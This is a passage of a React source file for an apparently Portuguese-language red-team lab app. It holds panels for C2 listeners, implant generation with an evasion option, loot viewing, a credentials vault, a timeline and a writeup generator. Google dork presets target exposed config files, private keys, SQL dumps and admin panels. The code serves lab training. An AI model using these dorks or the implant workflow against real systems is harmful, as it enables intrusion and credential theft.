                  {l.target_hostname && <div className="text-[10px] text-cyber-muted"> {l.target_hostname}</div>}
                  {l.loot_type === "screenshot" && l.content && (
                    <img src={`data:image/png;base64,${l.content}`} alt="loot"
                      className="w-full rounded border border-cyber-border" style={{ maxHeight: 120, objectFit: "cover" }} />
                  )}
                  {l.loot_type === "command" && l.content && (
                    <pre className="text-[10px] text-cyber-text bg-cyber-bg rounded p-2 max-h-20 overflow-y-auto whitespace-pre-wrap">{l.content.slice(0, 300)}{l.content.length > 300 ? "…" : ""}</pre>
                  )}
                  {l.loot_type === "file" && (
                    <div className="text-[11px] text-cyber-muted">
                      {l.metadata?.path} · {fmtBytes(l.metadata?.size)}
                      {l.content && (
                        <button onClick={() => {
                          const bytes = Uint8Array.from(atob(l.content), c => c.charCodeAt(0));
                          const blob = new Blob([bytes]);
                          const url = URL.createObjectURL(blob);
                          const a = document.createElement("a"); a.href = url; a.download = l.title.split(" — ")[0]; a.click(); URL.revokeObjectURL(url);
                        }} className="ml-2 text-cyber-accent text-[10px] hover:underline">⬇ baixar</button>
                      )}
                    </div>
                  )}
                  <div className="text-[10px] text-cyber-muted mt-auto">{fmtDateTime(l.created_at)}</div>
                </div>
              ))}
          </div>
        </div>
      )}

      {/* ── Listeners ─────────────────────────────────────────────────────── */}
      {activeTab === "listeners" && (
        <div>
          <div className={`${CARD} mb-4`}>
            <div className="text-xs text-cyber-muted mb-3">NOVO LISTENER</div>
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-2 mb-2">
              <div>
                <label className={LABEL}>Protocolo</label>
                <select className={INPUT} value={newListener.protocol} onChange={e => setNewListener(l => ({ ...l, protocol: e.target.value }))}>
                  <option value="http">HTTP</option>
                  <option value="https">HTTPS</option>
                  <option value="mtls">mTLS</option>
                  <option value="dns">DNS</option>
                </select>
              </div>
              <div>
                <label className={LABEL}>Porta</label>
                <input className={INPUT} type="number" value={newListener.port}
                  onChange={e => setNewListener(l => ({ ...l, port: Number(e.target.value) }))} />
              </div>
            </div>
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-2 mb-3">
              <div>
                <label className={LABEL}>Host (vazio = 0.0.0.0)</label>
                <input className={INPUT} placeholder="0.0.0.0" value={newListener.host}
                  onChange={e => setNewListener(l => ({ ...l, host: e.target.value }))} />
              </div>
              <div>
                <label className={LABEL}>Domínio (HTTPS/DNS)</label>
                <input className={INPUT} placeholder="c2.dominio.com" value={newListener.domain}
                  onChange={e => setNewListener(l => ({ ...l, domain: e.target.value }))} />
              </div>
            </div>
            <button onClick={startListener} className={BTN}> Iniciar Listener</button>
            {listenerError && <div className="text-cyber-danger text-xs mt-2">{listenerError}</div>}
          </div>

          <div className={CARD}>
            <div className="flex items-center justify-between mb-3">
              <div className="text-xs text-cyber-muted">LISTENERS ATIVOS ({listeners.length})</div>
              <button onClick={refreshListeners} disabled={listenerLoading} className={`${BTN_GHOST} text-xs`}>
                {listenerLoading ? "..." : "↻ Atualizar"}
              </button>
            </div>
            {listeners.length === 0 && !listenerLoading && (
              <div className="text-cyber-muted text-xs text-center py-6">Nenhum listener ativo</div>
            )}
            {listeners.map(j => (
              <div key={j.id} className="flex items-center justify-between py-2 border-b border-cyber-border/30">
                <div>
                  <div className="text-xs text-cyber-text font-mono">{j.name} <span className="text-cyber-muted">:{j.port}</span></div>
                  {j.description && <div className="text-[10px] text-cyber-muted">{j.description}</div>}
                  {j.domains?.length > 0 && <div className="text-[10px] text-cyber-muted">{j.domains.join(", ")}</div>}
                </div>
                <div className="flex items-center gap-2">
                  <span className="text-[10px] text-cyber-warning"> ATIVO</span>
                  <button onClick={() => killListener(j.id)} className="text-[11px] border border-cyber-danger text-cyber-danger rounded px-2 py-0.5 hover:bg-red-900/20">
                    Parar
                  </button>
                </div>
              </div>
            ))}
          </div>
        </div>
      )}

      {/* ── Implants ──────────────────────────────────────────────────────── */}
      {activeTab === "implants" && (
        <div className={`${CARD}`}>
          <div className="text-xs text-cyber-muted mb-4">GERAR NOVO IMPLANT</div>
          <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 mb-3">
            <div>
              <label className={LABEL}>Nome (opcional)</label>
              <input className={INPUT} placeholder="my_beacon" value={implantConfig.name}
                onChange={e => setImplantConfig(c => ({ ...c, name: e.target.value }))} />
            </div>
            <div>
              <label className={LABEL}>C2 URL</label>
              <input className={INPUT} placeholder="http://10.0.0.1:80" value={implantConfig.c2_url}
                onChange={e => setImplantConfig(c => ({ ...c, c2_url: e.target.value }))} />
            </div>
          </div>
          <div className="grid grid-cols-2 sm:grid-cols-3 gap-3 mb-3">
            <div>
              <label className={LABEL}>OS</label>
              <select className={INPUT} value={implantConfig.os} onChange={e => setImplantConfig(c => ({ ...c, os: e.target.value }))}>
                <option value="windows">Windows</option>
                <option value="linux">Linux</option>
                <option value="darwin">macOS</option>
              </select>
            </div>
            <div>
              <label className={LABEL}>Arch</label>
              <select className={INPUT} value={implantConfig.arch} onChange={e => setImplantConfig(c => ({ ...c, arch: e.target.value }))}>
                <option value="amd64">amd64</option>
                <option value="arm64">arm64</option>
                <option value="386">x86</option>
              </select>
            </div>
            <div>
              <label className={LABEL}>Formato</label>
              <select className={INPUT} value={implantConfig.format} onChange={e => setImplantConfig(c => ({ ...c, format: e.target.value }))}>
                <option value="exe">EXE</option>
                <option value="shared">Shared Lib</option>
                <option value="shellcode">Shellcode</option>
              </select>
            </div>
          </div>
          <div className="grid grid-cols-1 sm:grid-cols-3 gap-3 mb-3">
            <div>
              <label className={LABEL}>Tipo</label>
              <select className={INPUT} value={implantConfig.is_beacon ? "beacon" : "session"}
                onChange={e => setImplantConfig(c => ({ ...c, is_beacon: e.target.value === "beacon" }))}>
                <option value="beacon">Beacon (assíncrono)</option>
                <option value="session">Session (interativo)</option>
              </select>
            </div>
            {implantConfig.is_beacon && (
              <>
                <div>
                  <label className={LABEL}>Intervalo (s)</label>
                  <input className={INPUT} type="number" value={implantConfig.beacon_interval}
                    onChange={e => setImplantConfig(c => ({ ...c, beacon_interval: Number(e.target.value) }))} />
                </div>
                <div>
                  <label className={LABEL}>Jitter (s)</label>
                  <input className={INPUT} type="number" value={implantConfig.beacon_jitter}
                    onChange={e => setImplantConfig(c => ({ ...c, beacon_jitter: Number(e.target.value) }))} />
                </div>
              </>
            )}
          </div>
          <div className="flex items-center gap-4 mb-4 flex-wrap">
            <label className="flex items-center gap-2 text-xs text-cyber-muted cursor-pointer">
              <input type="checkbox" checked={implantConfig.evasion ?? false}
                onChange={e => setImplantConfig(c => ({ ...c, evasion: e.target.checked }))} />
              Evasion (--evasion --skip-symbols)
            </label>
            <label className="flex items-center gap-2 text-xs text-cyber-muted cursor-pointer">
              <input type="checkbox" checked={implantConfig.debug}
                onChange={e => setImplantConfig(c => ({ ...c, debug: e.target.checked }))} />
              Debug mode
            </label>
          </div>
          <button onClick={handleGenerate} disabled={!implantConfig.c2_url.trim() || implantLoading}
            className={`${BTN} disabled:opacity-40 w-full`}>
            {implantLoading ? " Gerando..." : " Gerar Implant"}
          </button>
          {implantError && <div className="text-cyber-danger text-xs mt-3">{implantError}</div>}
          {implantResult && (
            <div className="mt-3 bg-cyber-bg border border-cyber-border rounded p-3 text-xs">
              <div className="text-cyber-accent font-bold mb-1"> Gerado: {implantResult.name}</div>
              <div className="text-cyber-muted">Tamanho: {fmtBytes(implantResult.size)}</div>
              <div className="text-cyber-muted text-[10px] mt-1">O download já foi iniciado automaticamente.</div>
            </div>
          )}
        </div>
      )}
    </div>
  );
}

// ─── Google Dorks ──────────────────────────────────────────────────────────
const DORK_BLOCK_GROUPS = [
  {
    category: "Arquivos",
    blocks: [
      { id: "ft-pdf", text: "filetype:pdf", desc: "arquivos PDF" },
      { id: "ft-office", text: "(filetype:doc OR filetype:docx OR filetype:xls OR filetype:xlsx OR filetype:ppt)", desc: "documentos/planilhas/apresentações Office" },
      { id: "ft-sql", text: "filetype:sql", desc: "dumps de banco SQL" },
      { id: "ft-config", text: "(ext:env OR ext:config OR ext:cfg OR ext:ini OR ext:yml)", desc: "arquivos de configuração" },
      { id: "ft-backup", text: "(ext:bak OR ext:old OR ext:backup OR ext:zip OR ext:tar OR ext:sql.gz)", desc: "backups/arquivos compactados" },
      { id: "ft-log", text: "ext:log", desc: "arquivos de log" },
      { id: "ft-key", text: "(ext:pem OR ext:key OR ext:ppk)", desc: "possíveis chaves privadas" },
    ],
  },
  {
    category: "URLs",
    blocks: [
      { id: "u-admin", text: "inurl:admin", desc: "URLs com \"admin\"" },
      { id: "u-login", text: "inurl:login", desc: "páginas de login" },
      { id: "u-wp", text: "inurl:wp-admin", desc: "painel WordPress" },
      { id: "u-phpmy", text: "inurl:phpmyadmin", desc: "phpMyAdmin exposto" },
      { id: "u-api", text: "inurl:api", desc: "endpoints de API" },
      { id: "u-portal", text: "inurl:portal", desc: "portais internos" },
    ],
  },
  {
    category: "Conteúdo",
    blocks: [
      { id: "t-index", text: 'intitle:"index of"', desc: "diretórios expostos" },
      { id: "t-error", text: 'intext:"error" intext:"stack trace"', desc: "erros/stack traces" },
      { id: "t-password", text: 'intext:"password"', desc: "a palavra \"password\" no conteúdo" },
      { id: "t-confidential", text: 'intext:"confidential"', desc: "conteúdo marcado como confidencial" },
      { id: "t-swagger", text: 'intitle:"swagger"', desc: "documentação de API Swagger exposta" },
    ],
  },
  {
    category: "Exclusões",
    blocks: [
      { id: "x-www", text: "-inurl:www", desc: "excluindo o www principal (foca em subdomínios)" },
      { id: "x-github", text: "-site:github.com", desc: "excluindo resultados do GitHub" },
      { id: "x-social", text: "-site:linkedin.com -site:facebook.com -site:twitter.com", desc: "excluindo redes sociais" },
    ],
  },
  {
    category: "Personalizado",
    blocks: [
      { id: "c-inurl", text: "inurl:", desc: "URL contém", needsValue: true },
      { id: "c-intitle", text: "intitle:", desc: "título contém", needsValue: true },
      { id: "c-intext", text: "intext:", desc: "conteúdo contém", needsValue: true },
      { id: "c-exclude", text: "-", desc: "excluindo o termo", needsValue: true },
    ],
  },
];

const ALL_DORK_BLOCKS = DORK_BLOCK_GROUPS.flatMap(g => g.blocks.map(b => ({ ...b, category: g.category })));

function DorkPanel({ sessions, techniques, setTechniques }) {
  const [target, setTarget] = useState("");
  const [canvas, setCanvas] = useState([]);
  const [selectedLabSession, setSelectedLabSession] = useState("");
  const [results, setResults] = useState(null);
  const [lastQuery, setLastQuery] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(null);

  const addBlock = (block) => {
    setCanvas(c => [...c, { ...block, uid: `${block.id}-${Date.now()}-${Math.random().toString(36).slice(2, 6)}`, value: "" }]);
  };
  const removeBlock = (uid) => setCanvas(c => c.filter(b => b.uid !== uid));
  const updateValue = (uid, value) => setCanvas(c => c.map(b => b.uid === uid ? { ...b, value } : b));

  const query = [
    target.trim() ? `site:${target.trim()}` : null,
    ...canvas.map(b => {
      if (!b.needsValue) return b.text;
      if (!b.value.trim()) return null;
      return `${b.text}${/\s/.test(b.value) ? `"${b.value}"` : b.value}`;
    }),
  ].filter(Boolean).join(" ");

  const explanationBits = [
    target.trim() ? `dentro do domínio ${target.trim()}` : null,
    ...canvas.map(b => (b.needsValue ? (b.value.trim() ? `${b.desc} "${b.value}"` : null) : b.desc)),
  ].filter(Boolean);

  const fileBlockCount = canvas.filter(b => b.category === "Arquivos").length;

  const runQuery = async (q, start = 0) => {
    if (!q.trim()) return;
    setLoading(true);
    setError(null);
    if (start === 0) setResults(null);
    setLastQuery(q);
    try {
      const { data: { session } } = await supabase.auth.getSession();
      const res = await fetch(`/api/dork?q=${encodeURIComponent(q)}&start=${start}`, {
        headers: { Authorization: `Bearer ${session?.access_token || ""}` },
      });
      const data = await res.json();
      if (!res.ok) throw new Error(data.error || `Erro ${res.status}`);
      setResults(data);

      if (start !== 0) return;
      try {
        const technique = await createTechnique({
          session_id: selectedLabSession,
          mitre_id: "T1593",
          tactic: "Reconnaissance",
          technique_name: `Google Dork: ${q}`,
          tool_used: "Google Dorks",
          success: Number(data.totalResults) > 0,
          notes: `${data.totalResults} resultado(s).`,
        });
        const next = [technique, ...techniques];
        setTechniques(next);
        upsertProgress(technique.tactic, next.filter(x => x.tactic === technique.tactic).length).catch(() => {});
      } catch { /* logging da técnica é best-effort */ }
    } catch (err) {
      setError(err.message);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div>
      <InfoBox title={SECTION_INFO.dorks.title} icon={SECTION_INFO.dorks.icon}>{SECTION_INFO.dorks.content}</InfoBox>
      <div className={`${CARD} mb-4`}>
        <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 mb-4">
          <div>
            <label className={LABEL}>Domínio alvo</label>
            <input className={INPUT} placeholder="ex: exemplo.com" value={target} onChange={e => setTarget(e.target.value)} />
          </div>
          <div>
            <label className={LABEL}>Registrar em (sessão de lab)</label>
            <select className={INPUT} value={selectedLabSession} onChange={e => setSelectedLabSession(e.target.value)}>
              <option value="">— Sem sessão —</option>
              {sessions.map(s => <option key={s.id} value={s.id}>{s.title}</option>)}
            </select>
          </div>
        </div>

        <div className="text-xs text-cyber-muted mb-2">BLOCOS DE DORK — arraste pra caixa abaixo ou clique pra adicionar</div>
        {DORK_BLOCK_GROUPS.map(group => (
          <div key={group.category} className="mb-2.5">
            <div className="text-[10px] text-cyber-muted mb-1 tracking-wide">{group.category.toUpperCase()}</div>
            <div className="flex flex-wrap gap-1.5">
              {group.blocks.map(block => (
                <div
                  key={block.id}
                  draggable
                  onDragStart={e => e.dataTransfer.setData("text/plain", block.id)}
                  onClick={() => addBlock({ ...block, category: group.category })}
                  title={block.desc}
                  className="text-[11px] bg-cyber-bg border border-cyber-border rounded px-2 py-1 cursor-grab active:cursor-grabbing hover:border-cyber-accent hover:text-cyber-accent transition-colors font-mono select-none"
                >
                  {block.text}
                </div>
              ))}
            </div>
          </div>
        ))}

        <div className="text-[10px] text-cyber-muted mt-3 mb-1 tracking-wide">SUA QUERY</div>
        <div
          onDragOver={e => e.preventDefault()}
          onDrop={e => {
            const id = e.dataTransfer.getData("text/plain");
            const block = ALL_DORK_BLOCKS.find(b => b.id === id);
            if (block) addBlock(block);
          }}
          className="min-h-[52px] bg-cyber-bg border-2 border-dashed border-cyber-border rounded-md p-2 flex flex-wrap gap-1.5 items-center"
        >
          {target.trim() && (
            <span className="text-[11px] bg-cyber-surface border border-cyber-accent text-cyber-accent rounded px-2 py-1 font-mono">site:{target.trim()}</span>
          )}
          {canvas.length === 0 && !target.trim() && (
            <span className="text-[11px] text-cyber-muted italic">Arraste blocos aqui, ou clique neles acima</span>
          )}
          {canvas.map(b => (
            <span key={b.uid} className="text-[11px] bg-cyber-surface border border-cyber-border rounded px-2 py-1 font-mono flex items-center gap-1.5">
              {b.needsValue ? (
                <>
                  {b.text}
                  <input
                    autoFocus
                    className="bg-transparent border-b border-cyber-border outline-none text-cyber-text w-24"
                    placeholder="valor"
                    value={b.value}
                    onChange={e => updateValue(b.uid, e.target.value)}
                  />
                </>
              ) : b.text}
              <button onClick={() => removeBlock(b.uid)} className="text-cyber-danger hover:text-red-400"></button>
            </span>
          ))}
        </div>

        {fileBlockCount > 1 && (
          <div className="text-[11px] text-cyber-warning mt-2"> Vários filtros de arquivo combinados podem não funcionar como esperado — o Google geralmente só considera o último.</div>
        )}

        <div className="text-[11px] text-cyber-text mt-3 bg-cyber-bg border border-cyber-border rounded p-2">
          {explanationBits.length === 0
            ? "Monte a busca escolhendo um domínio e adicionando blocos acima."
            : `Isso vai buscar páginas ${explanationBits.join(", ")}.`}
        </div>

        <div className="flex gap-2 mt-3">
          <div className="flex-1 text-[12px] font-mono text-cyber-accent bg-cyber-bg border border-cyber-border rounded px-3 py-2 overflow-x-auto whitespace-nowrap">
            {query || "—"}
          </div>
          <button disabled={loading || !query.trim()} onClick={() => runQuery(query, 0)} className={`${BTN} disabled:opacity-40 disabled:cursor-not-allowed whitespace-nowrap`}>
            Buscar
          </button>
        </div>
        <div className="text-[11px] text-cyber-muted mt-2">Cada busca vira automaticamente um registro na aba Técnicas.</div>
      </div>

      {error && <div className={`${CARD} mb-4 text-cyber-danger text-xs`}>{error}</div>}
      {loading && <div className={`${CARD} mb-4 text-cyber-muted text-xs text-center`}>Buscando...</div>}

      {results && (
        <div className={CARD}>
          <div className="text-xs text-cyber-muted mb-3">{results.totalResults} resultado(s) para: <span className="text-cyber-text font-mono">{lastQuery}</span></div>
          {results.items.length === 0 ? (
            <div className="text-cyber-muted text-xs text-center py-5">Nenhum resultado</div>
          ) : (
            <div className="flex flex-col gap-2">
              {results.items.map((item, i) => (
                <a key={i} href={item.link} target="_blank" rel="noreferrer" className="block bg-cyber-bg border border-cyber-border rounded-md p-2.5 hover:border-cyber-accent transition-colors">
                  <div className="text-[13px] font-bold text-cyber-accent mb-0.5">{item.title}</div>
                  <div className="text-[10px] text-cyber-muted font-mono mb-1">{item.displayLink}</div>
                  <div className="text-[11px] text-slate-400">{item.snippet}</div>
                </a>
              ))}
            </div>
          )}
          {results.items.length > 0 && (
            <div className="flex justify-between items-center mt-3 pt-3 border-t border-cyber-border">
              <button
                disabled={loading || results.start === 0}
                onClick={() => runQuery(lastQuery, Math.max(0, results.start - 10))}
                className={`${BTN_GHOST} disabled:opacity-30 disabled:cursor-not-allowed`}
              >
                ← Anterior
              </button>
              <span className="text-[11px] text-cyber-muted">Página {Math.floor(results.start / 10) + 1}</span>
              <button
                disabled={loading || !results.hasNextPage}
                onClick={() => runQuery(lastQuery, results.start + 10)}
                className={`${BTN_GHOST} disabled:opacity-30 disabled:cursor-not-allowed`}
              >
                Próxima →
              </button>
            </div>
          )}
        </div>
      )}
    </div>
  );
}

// ─── Credentials Vault ─────────────────────────────────────────────────────
const CRED_TYPE_LABELS = { senha: "Senha", hash: "Hash", token: "Token", chave: "Chave" };
const CRED_TYPE_COLORS = { senha: "#4ade80", hash: "#f97316", token: "#60a5fa", chave: "#a855f7" };

function CredentialsVault({ credentials, setCredentials, vms, sessions }) {
  const [showNew, setShowNew] = useState(false);
  const [reveal, setReveal] = useState({});
  const [form, setForm] = useState({ type: "senha", username: "", secret: "", target_vm_id: "", session_id: "", notes: "" });

  const create = async () => {
    if (!form.username.trim() && !form.secret.trim()) return;
    const cred = await createCredential(form);
    setCredentials([cred, ...credentials]);
    setShowNew(false);
    setForm({ type: "senha", username: "", secret: "", target_vm_id: "", session_id: "", notes: "" });
  };

  const remove = async (id) => {
    await deleteCredential(id);
    setCredentials(credentials.filter(c => c.id !== id));
  };

  return (
    <div>
      <InfoBox title={SECTION_INFO.credentials.title} icon={SECTION_INFO.credentials.icon}>{SECTION_INFO.credentials.content}</InfoBox>
      <div className="flex justify-between items-center mb-4">
        <span className="text-xs text-cyber-muted">{credentials.length} credencial(is) registrada(s)</span>
        <button onClick={() => setShowNew(true)} className={BTN}>+ NOVA CREDENCIAL</button>
      </div>

      {credentials.length === 0 && (
        <div className={`${CARD} text-center py-10 text-cyber-muted mb-4`}>
          <div className="text-3xl mb-2"></div>
          <div>Nenhuma credencial registrada ainda</div>
          <div className="text-[11px] mt-1">Registre usuários/senhas/hashes encontrados durante o lab</div>
        </div>
      )}

      <div className="grid gap-2.5" style={{ gridTemplateColumns: "repeat(auto-fill, minmax(min(260px, 100%), 1fr))" }}>
        {credentials.map(c => {
          const vm = vms.find(v => v.id === c.target_vm_id);
          const session = sessions.find(s => s.id === c.session_id);
          const isRevealed = reveal[c.id];
          return (
            <div key={c.id} className={CARD} style={{ borderLeft: `3px solid ${CRED_TYPE_COLORS[c.type] || "#1E293B"}` }}>
              <div className="flex justify-between items-start mb-1.5">
                <span className="text-[10px] px-2 py-0.5 rounded" style={{ background: `${CRED_TYPE_COLORS[c.type] || "#64748B"}22`, color: CRED_TYPE_COLORS[c.type] || "#64748B" }}>
                  {CRED_TYPE_LABELS[c.type] || c.type}
                </span>
                <button onClick={() => remove(c.id)} className={`${BTN_GHOST} text-cyber-danger border-cyber-danger px-1.5 py-0`}></button>
              </div>
              {c.username && <div className="text-[13px] text-cyber-text mb-1"> {c.username}</div>}
              {c.secret && (
                <div className="text-[12px] font-mono text-cyber-text mb-1 flex items-center gap-1.5">
                   <span className={isRevealed ? "" : "blur-sm select-none"}>{c.secret}</span>
                  <button onClick={() => setReveal(r => ({ ...r, [c.id]: !r[c.id] }))} className="text-cyber-muted hover:text-cyber-accent text-[10px]">
                    {isRevealed ? "ocultar" : "revelar"}
                  </button>
                </div>
              )}
              <div className="text-[11px] text-cyber-muted">
                {vm && ` ${vm.name}`}{vm && session && " · "}{session && ` ${session.title}`}
              </div>
              {c.notes && <div className="text-xs text-slate-400 mt-1"> {c.notes}</div>}
              <div className="text-[11px] text-cyber-muted mt-1">{fmtDate(c.created_at)}</div>
            </div>
          );
        })}
      </div>

      {showNew && (
        <Modal title="NOVA CREDENCIAL" onClose={() => setShowNew(false)}>
          <div className="flex flex-col gap-3">
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
              <div>
                <label className={LABEL}>Tipo</label>
                <select className={INPUT} value={form.type} onChange={e => setForm({ ...form, type: e.target.value })}>
                  <option value="senha">Senha</option>
                  <option value="hash">Hash</option>
                  <option value="token">Token</option>
                  <option value="chave">Chave</option>
                </select>
              </div>
              <div>
                <label className={LABEL}>Usuário</label>
                <input className={INPUT} placeholder="ex: administrator" value={form.username} onChange={e => setForm({ ...form, username: e.target.value })} />
              </div>
            </div>
            <div>
              <label className={LABEL}>Segredo (senha/hash/token)</label>
              <input className={INPUT} placeholder="valor encontrado" value={form.secret} onChange={e => setForm({ ...form, secret: e.target.value })} />
            </div>
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
              <div>
                <label className={LABEL}>VM de origem</label>
                <select className={INPUT} value={form.target_vm_id} onChange={e => setForm({ ...form, target_vm_id: e.target.value })}>
                  <option value="">— Sem VM —</option>
                  {vms.map(v => <option key={v.id} value={v.id}>{v.name}</option>)}
                </select>
              </div>
              <div>
                <label className={LABEL}>Sessão</label>
                <select className={INPUT} value={form.session_id} onChange={e => setForm({ ...form, session_id: e.target.value })}>
                  <option value="">— Sem sessão —</option>
                  {sessions.map(s => <option key={s.id} value={s.id}>{s.title}</option>)}
                </select>
              </div>
            </div>
            <div>
              <label className={LABEL}>Notas</label>
              <textarea className={`${INPUT} h-20 resize-none`} placeholder="Como foi obtida, contexto..." value={form.notes} onChange={e => setForm({ ...form, notes: e.target.value })} />
            </div>
            <div className="flex gap-2 justify-end">
              <button onClick={() => setShowNew(false)} className={BTN_GHOST}>Cancelar</button>
              <button onClick={create} className={BTN}>REGISTRAR</button>
            </div>
          </div>
        </Modal>
      )}
    </div>
  );
}

// ─── Timeline / Kill Chain ─────────────────────────────────────────────────
function TimelineView({ sessions, techniques }) {
  const [selectedSession, setSelectedSession] = useState("");

  const sessionTechniques = selectedSession
    ? techniques.filter(t => t.session_id === selectedSession).sort((a, b) => new Date(a.created_at) - new Date(b.created_at))
    : [];

  return (
    <div>
      <div className={`${CARD} mb-4`}>
        <label className={LABEL}>Sessão</label>
        <select className={INPUT} value={selectedSession} onChange={e => setSelectedSession(e.target.value)}>
          <option value="">— Selecione uma sessão —</option>
          {sessions.map(s => <option key={s.id} value={s.id}>{s.title}</option>)}
        </select>
      </div>

      {!selectedSession && (
        <div className={`${CARD} text-center py-10 text-cyber-muted`}>
          <div className="text-3xl mb-2"></div>
          <div>Selecione uma sessão pra ver a linha do tempo</div>
        </div>
      )}

      {selectedSession && sessionTechniques.length === 0 && (
        <div className={`${CARD} text-center py-10 text-cyber-muted`}>Nenhuma técnica registrada nessa sessão ainda.</div>
      )}

      {sessionTechniques.length > 0 && (
        <div className="relative pl-6">
          <div className="absolute left-[7px] top-2 bottom-2 w-0.5 bg-cyber-border" />
          <div className="flex flex-col gap-4">
            {sessionTechniques.map((t, i) => {
              const color = TACTIC_COLORS[t.tactic] || "#64748B";
              return (
                <div key={t.id} className="relative">
                  <div className="absolute -left-6 top-1 w-3.5 h-3.5 rounded-full border-2 border-cyber-bg" style={{ background: color }} />
                  <div className={CARD}>
                    <div className="flex items-center gap-2 mb-1 flex-wrap">
                      <span className="text-[10px] text-cyber-muted font-mono">#{i + 1}</span>
                      {t.mitre_id && (
                        <a href={mitreUrl(t.mitre_id)} target="_blank" rel="noreferrer" className="text-[10px] bg-[#1a1a2e] text-indigo-400 border border-indigo-400 px-2 py-0.5 rounded font-mono hover:underline">
                          {t.mitre_id}
                        </a>
                      )}
                      <span className="text-[13px] font-bold text-cyber-text">{t.technique_name}</span>
                      <span className="text-[10px] px-2 py-0.5 rounded" style={{ background: t.success ? "#0d2818" : "#2a0f0f", color: t.success ? "#4ade80" : "#EF4444" }}>
                        {t.success ? "" : ""}
                      </span>
                    </div>
                    <div className="text-[11px] mb-1" style={{ color }}>{tacticLabel(t.tactic)}</div>
                    <div className="text-[11px] text-cyber-muted"> {t.tool_used} ·  {fmtDateTime(t.created_at)}</div>
                    {t.notes && <div className="text-xs text-slate-400 mt-1"> {t.notes}</div>}
                    {t.detection_notes && <div className="text-xs text-amber-400/80 mt-1"> {t.detection_notes}</div>}
                  </div>
                </div>
              );
            })}
          </div>
        </div>
      )}
    </div>
  );
}

// ─── Writeup Generator ────────────────────────────────────────────────────
function WriteupGenerator({ sessions, techniques, vms, loot }) {
  const [selectedSession, setSelectedSession] = useState("");
  const [writeup, setWriteup] = useState("");
  const [lootData, setLootData] = useState([]);
  const [generating, setGenerating] = useState(false);

  useEffect(() => {
    fetchLoot().then(setLootData).catch(() => {});
  }, []);

  const generate = () => {
    const session = sessions.find(s => s.id === selectedSession);
    if (!session) return;
    setGenerating(true);

    const sessionTech = techniques.filter(t => t.session_id === session.id);
    const sessionLoot = lootData.filter(l => l.session_id === session.id);
    const duration = fmtDuration(session.started_at || session.created_at, session.ended_at);

    const tacticGroups = {};
    sessionTech.forEach(t => {
      if (!tacticGroups[t.tactic]) tacticGroups[t.tactic] = [];
      tacticGroups[t.tactic].push(t);
    });

    const lines = [];
    lines.push(`# Writeup: ${session.title}`);
    lines.push("");
    lines.push(`**Data:** ${fmtDate(session.created_at)}`);
    lines.push(`**Duração:** ${duration}`);
    lines.push(`**Status:** ${STATUS_COLORS[session.status]?.label || session.status}`);
    if (session.objective) lines.push(`**Objetivo:** ${session.objective}`);
    lines.push("");

    lines.push("## Resumo Executivo");
    lines.push("");
    const successCount = sessionTech.filter(t => t.success).length;
    const failCount = sessionTech.length - successCount;
    lines.push(`Sessão de laboratório com **${sessionTech.length} técnica(s)** executada(s) (${successCount} com sucesso, ${failCount} falha(s)), cobrindo **${Object.keys(tacticGroups).length} fase(s)** da kill chain MITRE ATT&CK.`);
    lines.push("");

    if (Object.keys(tacticGroups).length > 0) {
      lines.push("## Técnicas por Fase");
      lines.push("");
      const tacticOrder = TACTICS.filter(t => tacticGroups[t]);
      for (const tactic of tacticOrder) {
        const techs = tacticGroups[tactic];
        lines.push(`### ${tacticLabel(tactic)}`);
        lines.push("");
        techs.forEach(t => {
          lines.push(`- **${t.technique_name}**${t.mitre_id ? ` (${t.mitre_id})` : ""} — ${t.success ? "Sucesso" : "Falhou"} — Ferramenta: ${t.tool_used}`);
          if (t.notes) lines.push(`  - Notas: ${t.notes.slice(0, 300)}`);
          if (t.detection_notes) lines.push(`  - Detecção: ${t.detection_notes.slice(0, 300)}`);
        });
        lines.push("");
      }
    }

    if (sessionLoot.length > 0) {
      lines.push("## Evidências Coletadas (Loot)");
      lines.push("");
      const grouped = { screenshot: [], command: [], file: [] };
      sessionLoot.forEach(l => { (grouped[l.loot_type] || []).push(l); });
      if (grouped.screenshot.length) {
        lines.push(`- **Screenshots:** ${grouped.screenshot.length} captura(s)`);
        grouped.screenshot.forEach(l => lines.push(`  - ${l.title}`));
      }
      if (grouped.command.length) {
        lines.push(`- **Outputs de comando:** ${grouped.command.length}`);
        grouped.command.forEach(l => lines.push(`  - \`${l.title}\``));
      }
      if (grouped.file.length) {
        lines.push(`- **Arquivos:** ${grouped.file.length}`);
        grouped.file.forEach(l => lines.push(`  - ${l.title}`));
      }
      lines.push("");
    }

    lines.push("## Conclusão");
    lines.push("");
    if (sessionTech.length === 0) {
      lines.push("Nenhuma técnica foi registrada nesta sessão.");
    } else {
      const coverage = Object.keys(tacticGroups).length;
      lines.push(`A sessão cobriu ${coverage} de ${TACTICS.length} fases da kill chain, demonstrando `);
      if (coverage >= 8) lines.push("uma operação completa com excelente cobertura de fases.");
      else if (coverage >= 5) lines.push("boa cobertura de fases com espaço para expandir o escopo.");
      else if (coverage >= 3) lines.push("foco em fases específicas da kill chain.");
      else lines.push("exercício pontual focado em técnicas específicas.");
      if (failCount > 0) lines.push(`\n${failCount} técnica(s) falharam, o que pode indicar controles de segurança ativos ou necessidade de ajuste na abordagem.`);
    }

    lines.push("");
    lines.push("---");
    lines.push(`*Gerado automaticamente pelo CyberLab em ${new Date().toLocaleString("pt-BR")}*`);

    setWriteup(lines.join("\n"));
    setGenerating(false);
  };

  const copyWriteup = () => {
    navigator.clipboard.writeText(writeup);
  };

  return (
    <div>
      <InfoBox title={SECTION_INFO.writeup.title} icon={SECTION_INFO.writeup.icon}>{SECTION_INFO.writeup.content}</InfoBox>

      <div className="flex gap-3 items-end mb-4">
        <div className="flex-1">
          <label className={LABEL}>Sessão</label>
          <select className={INPUT} value={selectedSession} onChange={e => setSelectedSession(e.target.value)}>
            <option value="">— Selecione uma sessão —</option>
            {sessions.map(s => <option key={s.id} value={s.id}>{s.title} ({fmtDate(s.created_at)})</option>)}
          </select>
        </div>
        <button onClick={generate} disabled={!selectedSession || generating} className={`${BTN} disabled:opacity-40`}>
          GERAR WRITEUP
        </button>
      </div>

      {writeup && (
        <div className={CARD}>
          <div className="flex justify-between items-center mb-3">
